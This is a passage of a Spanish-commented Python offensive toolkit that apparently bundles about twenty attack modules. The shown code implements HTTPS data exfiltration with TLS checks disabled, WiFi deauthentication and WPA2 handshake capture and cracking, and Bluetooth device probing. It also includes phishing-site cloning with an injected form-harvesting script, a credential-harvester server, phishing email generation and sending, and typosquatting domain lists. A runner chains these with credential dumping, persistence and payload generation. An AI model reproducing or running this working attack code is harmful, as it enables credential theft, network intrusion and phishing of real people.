            print(f"[!] Error steganography: {e}")
        return False

    def extract_steganography(self, stego_image_path: str) -> bytes:
        """Extrae datos ocultos de una imagen LSB"""
        print(f"[*] Extrayendo datos de {stego_image_path}")
        try:
            from PIL import Image
            import struct
            img = Image.open(stego_image_path).convert('RGBA')
            pixels = list(img.getdata())
            bits = ''
            for pixel in pixels:
                for channel in range(4):
                    bits += str(pixel[channel] & 1)
            # Leer los primeros 32 bits como longitud
            length = struct.unpack('>I', bytes([int(bits[i:i+8], 2) for i in range(0, 32, 8)]))[0]
            data = bytes([int(bits[32+i:32+i+8], 2) for i in range(0, length*8, 8)])
            print(f"[+] {len(data)} bytes extraídos")
            return data
        except Exception as e:
            print(f"[!] Error extrayendo: {e}")
        return b''

    def https_exfiltration(self, data: str, url: str) -> bool:
        """Exfiltra datos via HTTPS POST"""
        print(f"[*] Exfiltrando via HTTPS a {url}")
        try:
            import requests, urllib3
            urllib3.disable_warnings()
            encoded = base64.b64encode(data.encode()).decode()
            r = requests.post(url, json={'data': encoded}, timeout=10, verify=False)
            if r.status_code == 200:
                print(f"[+] Exfiltración HTTPS exitosa ({len(data)} bytes)")
                return True
        except ImportError:
            print("[!] requests no instalado: pip install requests")
        except Exception as e:
            print(f"[!] Error HTTPS exfil: {e}")
        return False

    def run(self, data: str = 'test_data', c2_domain: str = 'example.com') -> Dict:
        return {
            'dns_exfil': self.dns_exfiltration(data, c2_domain),
        }


# ═══════════════════════════════════════════════════════════════════
# MÓDULO 18: WIFI ATTACKER
# ═══════════════════════════════════════════════════════════════════

class WiFiAttacker:
    """Ataques WiFi — requiere Kali Linux + adaptador en modo monitor"""

    def check_requirements(self) -> Dict:
        """Verifica herramientas necesarias para ataques WiFi"""
        print("[*] Verificando requisitos para ataques WiFi")
        tools = {
            'aircrack-ng': False,
            'airodump-ng': False,
            'aireplay-ng': False,
            'airmon-ng':   False,
            'iwconfig':    False,
        }
        for tool in tools:
            r = subprocess.run(['which', tool], capture_output=True)
            tools[tool] = r.returncode == 0
            status = "✓" if tools[tool] else "✗"
            print(f"  [{status}] {tool}")
        if not any(tools.values()):
            print("[!] Ninguna herramienta WiFi encontrada")
            print("[*] Instalar: sudo apt-get install aircrack-ng")
        return tools

    def list_interfaces(self) -> List[str]:
        """Lista interfaces de red inalámbrica"""
        print("[*] Listando interfaces WiFi")
        interfaces = []
        try:
            r = subprocess.run(['iwconfig'], capture_output=True, text=True)
            for line in r.stdout.split('\n'):
                if 'IEEE 802.11' in line or 'ESSID' in line:
                    iface = line.split()[0]
                    if iface:
                        interfaces.append(iface)
                        print(f"[+] Interfaz WiFi: {iface}")
        except FileNotFoundError:
            print("[!] iwconfig no disponible")
        return interfaces

    def enable_monitor_mode(self, interface: str) -> str:
        """Habilita modo monitor en la interfaz"""
        print(f"[*] Habilitando modo monitor en {interface}")
        if os.geteuid() != 0:
            print("[!] Requiere root")
            return interface
        try:
            subprocess.run(['airmon-ng', 'start', interface], check=True, capture_output=True)
            mon_iface = interface + 'mon'
            # Verificar si la interfaz mon se creó
            r = subprocess.run(['iwconfig', mon_iface], capture_output=True)
            if r.returncode == 0:
                print(f"[+] Modo monitor habilitado: {mon_iface}")
                return mon_iface
        except FileNotFoundError:
            print("[!] airmon-ng no disponible: apt-get install aircrack-ng")
        except Exception as e:
            print(f"[!] Error: {e}")
        return interface

    def scan_networks(self, interface: str, duration: int = 15) -> str:
        """Escanea redes WiFi disponibles"""
        print(f"[*] Escaneando redes WiFi ({duration}s) en {interface}")
        output_file = f"/tmp/ghosttrack_wifi_{datetime.now().strftime('%H%M%S')}"
        if os.geteuid() != 0:
            print("[!] Requiere root")
            # Fallback sin monitor mode
            try:
                r = subprocess.run(['nmcli', 'dev', 'wifi', 'list'], capture_output=True, text=True)
                print(r.stdout)
                return r.stdout
            except Exception:
                return ""
        try:
            print(f"[*] Guardando en {output_file}-01.csv (Ctrl+C para detener)")
            subprocess.run(
                ['airodump-ng', '-w', output_file, '--output-format', 'csv', interface],
                timeout=duration
            )
        except subprocess.TimeoutExpired:
            print(f"[+] Escaneo completado: {output_file}-01.csv")
        except FileNotFoundError:
            print("[!] airodump-ng no disponible")
        except KeyboardInterrupt:
            print("[+] Escaneo detenido")
        return f"{output_file}-01.csv"

    def capture_handshake(self, interface: str, bssid: str = '', channel: int = 1) -> str:
        """Captura el handshake WPA2 de una red objetivo"""
        print(f"[*] Capturando handshake WPA2 en BSSID {bssid} canal {channel}")
        if os.geteuid() != 0:
            print("[!] Requiere root")
            return ""
        output_file = f"/tmp/handshake_{bssid.replace(':','')}"
        try:
            # Lanzar captura en background
            capture_cmd = ['airodump-ng', '-c', str(channel), '--bssid', bssid,
                          '-w', output_file, interface]
            capture_proc = subprocess.Popen(capture_cmd, stdout=subprocess.DEVNULL,
                                           stderr=subprocess.DEVNULL)
            import time
            time.sleep(3)
            # Enviar deauth para forzar reconexión
            deauth_cmd = ['aireplay-ng', '--deauth', '10', '-a', bssid, interface]
            subprocess.run(deauth_cmd, timeout=15, capture_output=True)
            time.sleep(5)
            capture_proc.terminate()
            print(f"[+] Captura guardada en {output_file}-01.cap")
            print(f"[+] Crackear con: aircrack-ng -w /usr/share/wordlists/rockyou.txt {output_file}-01.cap")
        except FileNotFoundError:
            print("[!] airodump-ng/aireplay-ng no disponibles: apt-get install aircrack-ng")
        except Exception as e:
            print(f"[!] Error: {e}")
        return f"{output_file}-01.cap"

    def deauth_attack(self, interface: str, bssid: str, client_mac: str = 'FF:FF:FF:FF:FF:FF', count: int = 10) -> bool:
        """Ataque de deautenticación"""
        print(f"[*] Deauth attack: AP={bssid} Cliente={client_mac}")
        if os.geteuid() != 0:
            print("[!] Requiere root")
            return False
        try:
            cmd = ['aireplay-ng', '--deauth', str(count), '-a', bssid, '-c', client_mac, interface]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            print(f"[+] Deauth enviados: {count}")
            return True
        except FileNotFoundError:
            print("[!] aireplay-ng no disponible")
        except Exception as e:
            print(f"[!] Error: {e}")
        return False

    def crack_handshake(self, cap_file: str, wordlist: str = '/usr/share/wordlists/rockyou.txt') -> str:
        """Crackea un handshake WPA2 con diccionario"""
        print(f"[*] Crackeando {cap_file} con {wordlist}")
        if not os.path.exists(cap_file):
            print(f"[!] Fichero no encontrado: {cap_file}")
            return ""
        if not os.path.exists(wordlist):
            print(f"[!] Wordlist no encontrada: {wordlist}")
            print("[*] Descomprimir: gunzip /usr/share/wordlists/rockyou.txt.gz")
            return ""
        try:
            result = subprocess.run(
                ['aircrack-ng', '-w', wordlist, cap_file],
                capture_output=True, text=True, timeout=300
            )
            output = result.stdout
            if 'KEY FOUND' in output:
                key = re.search(r'KEY FOUND! \[ (.*?) \]', output)
                if key:
                    print(f"[+] ¡CONTRASEÑA ENCONTRADA: {key.group(1)}")
                    return key.group(1)
            else:
                print("[-] Contraseña no encontrada en el diccionario")
            print(output[-500:])
        except subprocess.TimeoutExpired:
            print("[!] Timeout crackeando (wordlist muy grande)")
        except FileNotFoundError:
            print("[!] aircrack-ng no disponible")
        except Exception as e:
            print(f"[!] Error: {e}")
        return ""

    def run(self) -> Dict:
        return {
            'requirements': self.check_requirements(),
            'interfaces': self.list_interfaces(),
        }


# ═══════════════════════════════════════════════════════════════════
# MÓDULO 19: BLUETOOTH SCANNER
# ═══════════════════════════════════════════════════════════════════

class BluetoothScanner:
    """Escaneo y ataques Bluetooth"""

    def check_bluetooth_available(self) -> bool:
        """Verifica si Bluetooth está disponible"""
        for tool in ['hciconfig', 'hcitool', 'bluetoothctl']:
            r = subprocess.run(['which', tool], capture_output=True)
            if r.returncode == 0:
                return True
        return False

    def list_bt_interfaces(self) -> List[str]:
        """Lista interfaces Bluetooth"""
        print("[*] Listando interfaces Bluetooth")
        interfaces = []
        try:
            r = subprocess.run(['hciconfig'], capture_output=True, text=True)
            for line in r.stdout.split('\n'):
                if line.startswith('hci'):
                    iface = line.split(':')[0]
                    interfaces.append(iface)
                    print(f"[+] Interfaz BT: {iface}")
                    print(f"    {line}")
        except FileNotFoundError:
            print("[!] hciconfig no encontrado: apt-get install bluez")
        except Exception as e:
            print(f"[!] Error: {e}")
        return interfaces

    def scan_devices(self, duration: int = 10) -> List[Dict]:
        """Escanea dispositivos Bluetooth en rango"""
        print(f"[*] Escaneando dispositivos Bluetooth ({duration}s)")
        devices = []
        try:
            # Método 1: hcitool
            result = subprocess.run(
                ['hcitool', 'scan', '--flush'],
                capture_output=True, text=True, timeout=duration + 5
            )
            for line in result.stdout.strip().split('\n')[1:]:
                parts = line.strip().split('\t')
                if len(parts) >= 2:
                    mac  = parts[0].strip()
                    name = parts[1].strip() if len(parts) > 1 else 'Unknown'
                    devices.append({'mac': mac, 'name': name})
                    print(f"[+] Dispositivo BT: {mac}  {name}")
        except FileNotFoundError:
            print("[!] hcitool no encontrado: apt-get install bluez")
            # Fallback: bluetoothctl
            try:
                proc = subprocess.Popen(
                    ['bluetoothctl'],
                    stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE, text=True
                )
                out, _ = proc.communicate(input="scan on\n", timeout=duration)
                for line in out.split('\n'):
                    if 'Device' in line:
                        parts = line.split()
                        if len(parts) >= 3:
                            devices.append({'mac': parts[2], 'name': ' '.join(parts[3:])})
                            print(f"[+] BT: {parts[2]} {' '.join(parts[3:])}")
            except Exception as e2:
                print(f"[!] Error bluetoothctl: {e2}")
        except subprocess.TimeoutExpired:
            print(f"[+] Escaneo completado: {len(devices)} dispositivos")
        except Exception as e:
            print(f"[!] Error escaneo BT: {e}")
        return devices

    def get_device_info(self, mac: str) -> Dict:
        """Obtiene información detallada de un dispositivo"""
        print(f"[*] Obteniendo info de {mac}")
        info = {'mac': mac}
        try:
            # Clase del dispositivo y servicios
            r = subprocess.run(['hcitool', 'info', mac], capture_output=True, text=True, timeout=10)
            info['raw'] = r.stdout
            print(r.stdout)
            # Obtener servicios SDP
            r2 = subprocess.run(['sdptool', 'browse', mac], capture_output=True, text=True, timeout=15)
            info['services'] = r2.stdout
            if r2.stdout:
                print(f"[+] Servicios SDP:\n{r2.stdout[:500]}")
        except FileNotFoundError:
            print("[!] hcitool/sdptool no disponible")
        except Exception as e:
            print(f"[!] Error: {e}")
        return info

    def check_blueborne(self, mac: str) -> Dict:
        """Verifica si el dispositivo puede ser vulnerable a BlueBorne"""
        print(f"[*] Verificando BlueBorne en {mac}")
        result = {'mac': mac, 'potentially_vulnerable': False, 'reason': ''}
        # BlueBorne afecta a dispositivos Android <8.0, Linux <4.14, Windows antes de parche
        # Verificación básica basada en clase del dispositivo y nombre
        info = self.get_device_info(mac)
        if info.get('raw'):
            if 'Linux' in info['raw'] or 'Android' in info['raw']:
                result['potentially_vulnerable'] = True
                result['reason'] = 'Sistema operativo potencialmente vulnerable a BlueBorne'
                print(f"[+] Posiblemente vulnerable a BlueBorne: {mac}")
        return result

    def run(self) -> Dict:
        return {
            'bt_available': self.check_bluetooth_available(),
            'interfaces': self.list_bt_interfaces(),
            'devices': self.scan_devices(10) if self.check_bluetooth_available() else []
        }


# ═══════════════════════════════════════════════════════════════════
# MÓDULO 20: SOCIAL ENGINEERING TOOLKIT
# ═══════════════════════════════════════════════════════════════════

class SocialEngineeringToolkit:
    """Framework de ingeniería social"""

    def clone_website(self, url: str, output_dir: str = '/tmp/clone') -> bool:
        """Clona un sitio web para phishing"""
        print(f"[*] Clonando {url}")
        os.makedirs(output_dir, exist_ok=True)
        try:
            import requests
            from bs4 import BeautifulSoup
            import urllib.parse

            r = requests.get(url, timeout=10, verify=False)
            soup = BeautifulSoup(r.text, 'html.parser')

            # Modificar formularios para capturar credenciales
            for form in soup.find_all('form'):
                form['action'] = '/harvest'

            # Añadir script de captura
            harvest_script = soup.new_tag('script')
            harvest_script.string = """
document.addEventListener('submit', function(e) {
    var formData = new FormData(e.target);
    fetch('/harvest', {method:'POST', body: formData});
});
"""
            soup.body.append(harvest_script)

            output_file = os.path.join(output_dir, 'index.html')
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(str(soup))
            print(f"[+] Sitio clonado en {output_file}")
            print(f"[+] Servir con: python3 -m http.server 80 --directory {output_dir}")
            return True
        except ImportError:
            print("[!] requests/bs4 no instalados: pip install requests beautifulsoup4")
        except Exception as e:
            print(f"[!] Error clonando: {e}")
        return False

    def generate_phishing_email(self, target_name: str, target_email: str,
                                sender_name: str, sender_email: str,
                                subject: str, phishing_url: str) -> str:
        """Genera un email de phishing personalizado"""
        print(f"[*] Generando email phishing para {target_email}")
        email_body = f"""From: {sender_name} <{sender_email}>
To: {target_name} <{target_email}>
Subject: {subject}
Content-Type: text/html; charset=UTF-8

<html><body>
<p>Estimado/a {target_name},</p>
<p>Le informamos que su cuenta requiere verificación inmediata.</p>
<p>Por favor, acceda a través del siguiente enlace:</p>
<p><a href="{phishing_url}">{phishing_url}</a></p>
<p>Si no completa este proceso en 24 horas, su acceso será suspendido.</p>
<p>Atentamente,<br>{sender_name}<br>Equipo de Seguridad</p>
</body></html>
"""
        output_file = f"/tmp/phishing_{target_email.replace('@','_')}.eml"
        with open(output_file, 'w') as f:
            f.write(email_body)
        print(f"[+] Email generado: {output_file}")
        return email_body

    def credential_harvester(self, port: int = 8080) -> None:
        """Servidor simple para capturar credenciales de phishing"""
        print(f"[*] Iniciando credential harvester en puerto {port}")
        try:
            from http.server import HTTPServer, BaseHTTPRequestHandler
            import urllib.parse

            credentials_file = '/tmp/harvested_creds.txt'

            class HarvestHandler(BaseHTTPRequestHandler):
                def do_GET(self):
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b"<h1>Login</h1>")

                def do_POST(self):
                    length = int(self.headers.get('Content-Length', 0))
                    body = self.rfile.read(length).decode()
                    params = urllib.parse.parse_qs(body)
                    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    cred_line = f"[{timestamp}] IP: {self.client_address[0]} | {body}"
                    print(f"\n[+] CREDENCIALES CAPTURADAS: {cred_line}")
                    with open(credentials_file, 'a') as f:
                        f.write(cred_line + '\n')
                    self.send_response(302)
                    self.send_header('Location', 'https://real-site.com')
                    self.end_headers()

                def log_message(self, format, *args):
                    pass  # Silenciar logs por defecto

            server = HTTPServer(('0.0.0.0', port), HarvestHandler)
            print(f"[+] Harvester activo en http://0.0.0.0:{port}")
            print(f"[+] Credenciales en: {credentials_file}")
            print("[*] Ctrl+C para detener")
            server.serve_forever()
        except KeyboardInterrupt:
            print("\n[+] Harvester detenido")
        except Exception as e:
            print(f"[!] Error: {e}")

    def check_set_available(self) -> bool:
        """Verifica si SET (Social Engineering Toolkit) está disponible"""
        r = subprocess.run(['which', 'setoolkit'], capture_output=True)
        if r.returncode == 0:
            print("[+] SET disponible: ejecutar 'sudo setoolkit'")
            return True
        print("[*] SET no encontrado: apt-get install set")
        return False

    def generate_typosquatting_domains(self, domain: str) -> List[str]:
        """Genera dominios typosquatting para un dominio objetivo"""
        print(f"[*] Generando variantes typosquatting de {domain}")
        variants = []
        parts = domain.split('.')
        name = parts[0]
        tld  = '.'.join(parts[1:])

        # Variantes comunes
        variants += [
            f"{name}-corp.{tld}",
            f"{name}-secure.{tld}",
            f"{name}-login.{tld}",
            f"{name}0.{tld}",
            f"my{name}.{tld}",
            f"{name}.{tld}.co",
            f"{name}support.{tld}",
        ]
        # Sustituciones de caracteres similares
        char_subs = {'a': '4', 'e': '3', 'i': '1', 'o': '0', 'l': '1', 's': '5'}
        for old, new in char_subs.items():
            if old in name:
                variants.append(f"{name.replace(old, new, 1)}.{tld}")

        print(f"[+] {len(variants)} variantes generadas:")
        for v in variants:
            print(f"    {v}")
        return variants

    def send_email(self, smtp_host: str, smtp_port: int, username: str,
                   password: str, from_addr: str, to_addr: str,
                   subject: str, body: str) -> bool:
        """Envía email de phishing via SMTP"""
        print(f"[*] Enviando email de {from_addr} a {to_addr}")
        try:
            import smtplib
            from email.mime.text import MIMEText
            from email.mime.multipart import MIMEMultipart
            msg = MIMEMultipart('alternative')
            msg['Subject'] = subject
            msg['From']    = from_addr
            msg['To']      = to_addr
            msg.attach(MIMEText(body, 'html'))
            with smtplib.SMTP(smtp_host, smtp_port) as server:
                server.ehlo()
                server.starttls()
                server.login(username, password)
                server.sendmail(from_addr, to_addr, msg.as_string())
            print(f"[+] Email enviado a {to_addr}")
            return True
        except Exception as e:
            print(f"[!] Error enviando email: {e}")
        return False

    def run(self) -> Dict:
        return {
            'set_available': self.check_set_available(),
        }


# ═══════════════════════════════════════════════════════════════════
# FUNCIÓN PRINCIPAL DE EVALUACIÓN RED TEAM
# ═══════════════════════════════════════════════════════════════════

def run_full_redteam_assessment(target: str, domain: str = None) -> Dict:
    """Ejecuta evaluación completa Red Team"""
    print(f"\n{'='*70}")
    print(f"RED TEAM ASSESSMENT COMPLETO: {target}")
    if domain:
        print(f"DOMINIO: {domain}")
    print(f"{'='*70}\n")

    results = {
        'target': target,
        'domain': domain,
        'timestamp': datetime.now().isoformat(),
        'modules': {}
    }

    # Módulo 1: SMB
    print("\n[*] === MÓDULO 1: SMB Enumeration ===")
    smb = SMBEnumerator(target)
    results['modules']['smb'] = smb.run()

    # Módulo 2: LDAP (solo si hay dominio)
    if domain:
        print("\n[*] === MÓDULO 2: LDAP Enumeration ===")
        ldap = LDAPEnumerator(target, domain)
        results['modules']['ldap'] = ldap.run()

    # Módulo 6: PrivEsc
    print("\n[*] === MÓDULO 6: Privilege Escalation ===")
    privesc = PrivilegeEscalationChecker()
    results['modules']['privesc'] = privesc.check_all_linux()

    # Módulo 8: Credentials
    print("\n[*] === MÓDULO 8: Credential Dumping ===")
    dumper = CredentialDumper(target)
    results['modules']['credentials'] = dumper.dump_all()

    # Módulo 11: DLL Hijacking
    print("\n[*] === MÓDULO 11: DLL Hijacking ===")
    dll = DLLHijackingScanner()
    results['modules']['dll_hijacking'] = dll.scan()

    # Módulo 12: Persistence
    print("\n[*] === MÓDULO 12: Persistence ===")
    persist = PersistenceChecker()
    results['modules']['persistence'] = persist.run()

    # Módulo 14: AV Evasion info
    print("\n[*] === MÓDULO 14: AV Detection ===")
    av = AVEvasion()
    results['modules']['av_detected'] = av.check_av_running()

    # Módulo 15: Payload Generator info
    print("\n[*] === MÓDULO 15: Payload Generator ===")
    pg = PayloadGenerator()
    results['modules']['payloads'] = pg.run(target, 4444)

    # Módulo 18: WiFi
    print("\n[*] === MÓDULO 18: WiFi ===")
    wifi = WiFiAttacker()
    results['modules']['wifi'] = wifi.run()

    # Módulo 19: Bluetooth
    print("\n[*] === MÓDULO 19: Bluetooth ===")
    bt = BluetoothScanner()
    results['modules']['bluetooth'] = bt.run()

    print(f"\n{'='*70}")
    print(f"[+] Red Team Assessment completado")
    print(f"{'='*70}")

    return results


if __name__ == "__main__":
    print(__doc__)
    print("\n[*] Módulos Red Team cargados correctamente")
    print("[*] 20 módulos disponibles")
    print("\n[*] Dependencias necesarias:")
    print("    pip install impacket ldap3 pycryptodome requests scapy dnspython")
    print("    sudo apt-get install aircrack-ng bluez")
